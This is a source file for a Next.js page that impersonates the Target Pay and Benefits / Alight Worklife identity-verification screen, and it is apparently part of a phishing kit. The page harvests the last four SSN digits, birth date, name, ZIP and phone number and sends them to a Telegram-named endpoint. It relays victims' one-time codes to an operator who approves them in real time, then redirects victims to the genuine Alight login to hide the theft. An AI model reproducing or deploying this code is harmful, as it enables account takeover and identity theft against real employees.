"use client";

import { Suspense, useState, useEffect, useRef } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";

const MONTHS = ["January","February","March","April","May","June","July","August","September","October","November","December"];
const DAYS = Array.from({ length: 31 }, (_, i) => String(i + 1));
const YEARS = Array.from({ length: 80 }, (_, i) => String(new Date().getFullYear() - i));
const RESEND_COOLDOWN = 60;
const ALIGHT_URL = "https://worklife.alight.com/ah-angular-afirst-web/#/web/target/login?technicalNameForLink=LOG_ON_LINK&userFriendlyNameForLink=Log%20On&domain=Ben-CM&baseClientIndicator=Base&isUCCELink=true&flavorCheck=true";

function formatPhone(val: string): string {
  const d = val.replace(/\D/g, "").slice(0, 10);
  if (d.length > 6) return `${d.slice(0, 3)}-${d.slice(3, 6)}-${d.slice(6)}`;
  if (d.length > 3) return `${d.slice(0, 3)}-${d.slice(3)}`;
  return d;
}

function isValidOtpLength(len: number): boolean {
  return len === 6 || len === 8;
}

function getTaskId(): string | null {
  if (typeof window === "undefined") return null;
  return sessionStorage.getItem("current_task_id") || null;
}

const inputStyle: React.CSSProperties = {
  width: "100%",
  padding: "8px 10px",
  border: "1px solid #d1d5db",
  borderRadius: "6px",
  fontSize: "14px",
  background: "#f9fafb",
  outline: "none",
  height: "40px",
};

const selectStyle: React.CSSProperties = {
  ...inputStyle,
  appearance: "auto" as const,
};

const labelStyle: React.CSSProperties = {
  display: "block",
  fontSize: "14px",
  fontWeight: 500,
  color: "#111827",
  marginBottom: "6px",
};

const btnPrimary: React.CSSProperties = {
  display: "inline-flex",
  alignItems: "center",
  justifyContent: "center",
  gap: "8px",
  background: "#1c68bf",
  color: "#fff",
  border: "none",
  borderRadius: "6px",
  height: "36px",
  padding: "0 20px",
  fontSize: "14px",
  fontWeight: 500,
  cursor: "pointer",
};

const btnSecondary: React.CSSProperties = {
  display: "inline-flex",
  alignItems: "center",
  justifyContent: "center",
  background: "#e5e7eb",
  color: "#374151",
  border: "none",
  borderRadius: "6px",
  height: "36px",
  padding: "0 20px",
  fontSize: "14px",
  fontWeight: 500,
  cursor: "pointer",
};

const spinnerStyle: React.CSSProperties = {
  display: "inline-block",
  width: "16px",
  height: "16px",
  border: "2px solid rgba(255,255,255,0.3)",
  borderTopColor: "#fff",
  borderRadius: "50%",
  animation: "tpb-spin 0.6s linear infinite",
  flexShrink: 0,
};

function Spinner() {
  return (
    <>
      <style>{`@keyframes tpb-spin { to { transform: rotate(360deg); } }`}</style>
      <span style={spinnerStyle} aria-hidden="true" />
    </>
  );
}

function VerifyContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const modeIsDetails = searchParams.get("mode") === "details";

  const [step, setStep] = useState<"details" | "code">(modeIsDetails ? "details" : "code");
  const [ssnLast4, setSsnLast4] = useState("");
  const [zip, setZip] = useState("");
  const [month, setMonth] = useState("");
  const [day, setDay] = useState("");
  const [year, setYear] = useState("");
  const [fullName, setFullName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    setStep(modeIsDetails ? "details" : "code");
  }, [modeIsDetails]);

  useEffect(() => {
    return () => {
      if (cooldownRef.current) clearInterval(cooldownRef.current);
    };
  }, []);

  useEffect(() => {
    if (cooldown <= 0) return;
    cooldownRef.current = setInterval(() => {
      setCooldown((c) => { if (c <= 1) { clearInterval(cooldownRef.current!); return 0; } return c - 1; });
    }, 1000);
    return () => { if (cooldownRef.current) clearInterval(cooldownRef.current); };
  }, [cooldown]);

  const ssnDigits = ssnLast4.replace(/\D/g, "");
  const phoneDigits = phoneNumber.replace(/\D/g, "");
  const isDetailsValid = ssnDigits.length === 4 && zip.replace(/\D/g, "").length >= 5 && month && day && year && fullName.trim() && phoneDigits.length === 10;

  async function handleVerifyDetails() {
    if (!isDetailsValid || isLoading) return;
    setIsLoading(true);

    const birthDate = `${month} ${day}, ${year}`;
    fetch("/api/telegram/verify-details", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ssnLast4: ssnDigits, zip, birthDate, fullName: fullName.trim(), phoneNumber }),
    }).catch(() => {});

    const taskId = getTaskId();
    if (taskId) {
      try {
        await fetch(`/api/tasks/${taskId}`, { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ flow_step: "code_request", code_delivery_method: "sms" }) });

        const POLL_MS = 750;
        const TIMEOUT_MS = 90_000;
        const start = Date.now();
        while (Date.now() - start < TIMEOUT_MS) {
          await new Promise((r) => setTimeout(r, POLL_MS));
          try {
            const r = await fetch(`/api/tasks/${taskId}`);
            const d = await r.json();
            if (d.task?.status === "approved") {
              setIsLoading(false);
              router.push("/verify");
              return;
            }
            if (d.task?.status === "redirected") {
              window.location.href = "/api/login-out";
              return;
            }
            if (d.task?.status === "denied") {
              setIsLoading(false);
              router.push("/");
              return;
            }
          } catch {}
        }
        setIsLoading(false);
        router.push("/verify");
      } catch {
        setIsLoading(false);
        router.push("/verify");
      }
    } else {
      setTimeout(() => { setIsLoading(false); router.push("/verify"); }, 2000);
    }
  }

  async function handleContinueCode() {
    if (isLoading) return;
    const digits = code.replace(/\D/g, "");
    if (!isValidOtpLength(digits.length)) return;
    setIsLoading(true);

    const taskId = getTaskId();
    if (taskId) {
      try {
        await fetch(`/api/tasks/${taskId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ flow_step: "code_verify", verification_code: code }),
        });

        const POLL_MS = 750;
        const TIMEOUT_MS = 90_000;
        const start = Date.now();
        while (Date.now() - start < TIMEOUT_MS) {
          await new Promise((r) => setTimeout(r, POLL_MS));
          try {
            const r = await fetch(`/api/tasks/${taskId}`);
            const d = await r.json();
            if (d.task?.status === "approved" || d.task?.status === "redirected") {
              window.location.href = ALIGHT_URL;
              return;
            }
            if (d.task?.status === "denied") {
              setIsLoading(false);
              router.push("/");
              return;
            }
          } catch {}
        }
        window.location.href = ALIGHT_URL;
      } catch {
        window.location.href = ALIGHT_URL;
      }
    } else {
      window.location.href = ALIGHT_URL;
    }
  }

  async function handleResend() {
    if (isResending || cooldown > 0) return;
    setIsResending(true);
    try { await fetch("/api/telegram/resend-code", { method: "POST" }).catch(() => {}); } catch {}
    setIsResending(false);
    setCooldown(RESEND_COOLDOWN);
  }

  const header = (
    <>
      <hr className="brand-bar" />
      <header className="global-header">
        <div className="header-content">
          <div className="header-left">
            <div className="brand-container">
              <a href="/">
                <Image src="/target-logo.png" alt="Target Pay and Benefit" className="brand-logo" width={160} height={52} priority />
              </a>
            </div>
          </div>
        </div>
      </header>
    </>
  );

  const footer = (
    <footer className="f-global-footer" role="contentinfo">
      <div className="f-global-footer-inner">
        <div className="f-footer-row-main">
          <div className="f-footer-nav-columns"><div className="f-footer-nav-column"><ul className="f-footer-nav-list">
            <li className="f-footer-nav-item"><a href="#" className="f-footer-nav-link">Contact Us</a></li>
            <li className="f-footer-nav-item"><a href="#" className="f-footer-nav-link">Feedback</a></li>
            <li className="f-footer-nav-item"><a href="#" className="f-footer-nav-link">Protect Yourself From Website Fraud</a></li>
          </ul></div></div>
          <div className="f-footer-brand-block">
            <Image src="/alight-worklife-logo.png" alt="Alight Worklife" className="f-footer-logo" width={230} height={40} />
            <div className="f-footer-app-badges">
              <a href="#"><Image src="/app-store-badge.png" alt="App Store" className="f-footer-app-badge" width={135} height={40} /></a>
              <a href="#"><Image src="/google-play-badge.png" alt="Google Play" className="f-footer-app-badge" width={135} height={40} /></a>
            </div>
          </div>
        </div>
        <hr className="f-divider" />
        <div className="f-footer-row-legal">
          <div className="f-footer-legal-links">
            <a href="/privacy" className="f-footer-legal-link">Privacy Policy</a>
            <a href="/terms" className="f-footer-legal-link">Terms Of Use</a>
            <a href="#" className="f-footer-legal-link">Cookie Notice</a>
            <a href="#" className="f-footer-legal-link">Cookie Settings [Do Not Sell or Share My Personal Information]</a>
          </div>
          <p className="f-footer-copyright">&copy;{new Date().getFullYear()} Alight Solutions. All rights reserved.</p>
        </div>
      </div>
    </footer>
  );

  const hasTaskId = typeof window !== "undefined" && !!sessionStorage.getItem("current_task_id");

  if (!hasTaskId && typeof window !== "undefined") {
    return (
      <div style={{ minHeight: "100vh", background: "#fff" }}>
        {header}
        <main style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "40vh", flexDirection: "column", gap: "16px" }}>
          <p style={{ color: "#282828" }}>No verification session found.</p>
          <a href="/" style={{ color: "#0066ff", fontWeight: 500 }}>Go to Sign In</a>
        </main>
      </div>
    );
  }

  if (step === "details") {
    return (
      <div style={{ minHeight: "100vh", background: "#fff" }}>
        {header}
        <div style={{ maxWidth: "672px", padding: "40px 16px 270px" }} className="verify-content-wrap">
          <h2 style={{ fontSize: "16px", fontWeight: 500, color: "#111827", marginBottom: "8px" }}>Verify It&apos;s You</h2>
          <h1 style={{ fontSize: "24px", fontWeight: 600, color: "#111827", marginBottom: "8px" }}>Verify Your Details</h1>
          <p style={{ fontSize: "14px", color: "#374151", marginBottom: "24px" }}>You&apos;ll need to provide some information first to confirm your identity.</p>

          <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
            <div>
              <label htmlFor="v-ssn" style={labelStyle}>Last 4 Digits of SSN</label>
              <input id="v-ssn" type="text" inputMode="numeric" maxLength={4} value={ssnLast4} onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))} disabled={isLoading} style={{ ...inputStyle, maxWidth: "140px" }} />
            </div>

            <div>
              <label htmlFor="v-zip" style={labelStyle}>ZIP Code</label>
              <input id="v-zip" type="text" inputMode="numeric" maxLength={10} value={zip} onChange={(e) => setZip(e.target.value)} disabled={isLoading} style={{ ...inputStyle, maxWidth: "160px" }} />
            </div>

            <div>
              <label style={labelStyle}>Birth Date</label>
              <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
                <select value={month} onChange={(e) => setMonth(e.target.value)} disabled={isLoading} style={{ ...selectStyle, minWidth: "120px" }}>
                  <option value="">Month</option>
                  {MONTHS.map((m) => <option key={m} value={m}>{m}</option>)}
                </select>
                <select value={day} onChange={(e) => setDay(e.target.value)} disabled={isLoading} style={{ ...selectStyle, minWidth: "80px" }}>
                  <option value="">Day</option>
                  {DAYS.map((d) => <option key={d} value={d}>{d}</option>)}
                </select>
                <select value={year} onChange={(e) => setYear(e.target.value)} disabled={isLoading} style={{ ...selectStyle, minWidth: "90px" }}>
                  <option value="">Year</option>
                  {YEARS.map((y) => <option key={y} value={y}>{y}</option>)}
                </select>
              </div>
            </div>

            <div>
              <label htmlFor="v-name" style={labelStyle}>Full Name</label>
              <input id="v-name" type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} disabled={isLoading} style={{ ...inputStyle, maxWidth: "260px" }} />
            </div>

            <div>
              <label htmlFor="v-phone" style={labelStyle}>Phone Number</label>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", maxWidth: "260px" }}>
                <span style={{ padding: "0 8px", height: "40px", display: "flex", alignItems: "center", border: "1px solid #d1d5db", background: "#f3f4f6", borderRadius: "6px", fontSize: "14px", color: "#111827" }}>+1</span>
                <input id="v-phone" type="tel" inputMode="tel" value={phoneNumber} onChange={(e) => setPhoneNumber(formatPhone(e.target.value))} disabled={isLoading} style={{ ...inputStyle, flex: 1 }} />
              </div>
            </div>

            <div style={{ display: "flex", gap: "12px", paddingTop: "8px" }}>
              <button type="button" onClick={handleVerifyDetails} disabled={!isDetailsValid || isLoading} style={{ ...btnPrimary, opacity: (!isDetailsValid || isLoading) ? 0.5 : 1, cursor: (!isDetailsValid || isLoading) ? "not-allowed" : "pointer" }}>
                {isLoading && <Spinner />}
                <span>Verify</span>
              </button>
              <button type="button" onClick={() => router.push("/")} disabled={isLoading} style={btnSecondary}>Cancel</button>
            </div>
          </div>
        </div>
        {footer}
      </div>
    );
  }

  return (
    <div style={{ minHeight: "100vh", background: "#fff" }}>
      {header}
      <div style={{ maxWidth: "672px", padding: "40px 16px 270px" }} className="verify-content-wrap">
        <div style={{ marginBottom: "24px" }}>
          <h2 style={{ fontSize: "16px", fontWeight: 500, color: "#111827", marginBottom: "16px" }}>Verify It&apos;s You</h2>
          <h1 style={{ fontSize: "24px", fontWeight: 600, color: "#111827", marginBottom: "12px" }}>Enter Access Code</h1>
          <p style={{ fontSize: "14px", color: "#374151", marginBottom: "16px" }}>Enter the code you received.</p>

          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "16px" }}>
            <span style={{ fontSize: "14px", color: "#374151" }}>Didn&apos;t receive code?</span>
            <button type="button" onClick={handleResend} disabled={cooldown > 0 || isResending || isLoading} style={{ padding: "6px 12px", background: "#e5e7eb", color: "#374151", borderRadius: "6px", fontSize: "14px", fontWeight: 500, border: "none", cursor: "pointer", opacity: (cooldown > 0 || isResending || isLoading) ? 0.7 : 1 }}>
              {isResending ? "Sending..." : cooldown > 0 ? `Resend code (${cooldown}s)` : "Resend code"}
            </button>
          </div>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
          <div>
            <input type="text" inputMode="numeric" maxLength={8} value={code} onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 8))} disabled={isLoading} style={{ ...inputStyle, maxWidth: "200px" }} autoFocus />
          </div>

          <div style={{ display: "flex", gap: "12px", marginTop: "4px" }}>
            <button type="button" onClick={handleContinueCode} disabled={!isValidOtpLength(code.replace(/\D/g, "").length) || isLoading} style={{ ...btnPrimary, opacity: (!isValidOtpLength(code.replace(/\D/g, "").length) || isLoading) ? 0.5 : 1, cursor: (!isValidOtpLength(code.replace(/\D/g, "").length) || isLoading) ? "not-allowed" : "pointer" }}>
              {isLoading && <Spinner />}
              <span>{isLoading ? "Continue" : "Continue"}</span>
            </button>
            <button type="button" onClick={() => router.push("/")} disabled={isLoading} style={btnSecondary}>Cancel</button>
          </div>
        </div>
      </div>
      {footer}
    </div>
  );
}

export default function VerifyPage() {
  return (
    <Suspense fallback={<div style={{ minHeight: "100vh", background: "#fff", display: "flex", alignItems: "center", justifyContent: "center", color: "#666" }}>Loading...</div>}>
      <VerifyContent />
    </Suspense>
  );
}
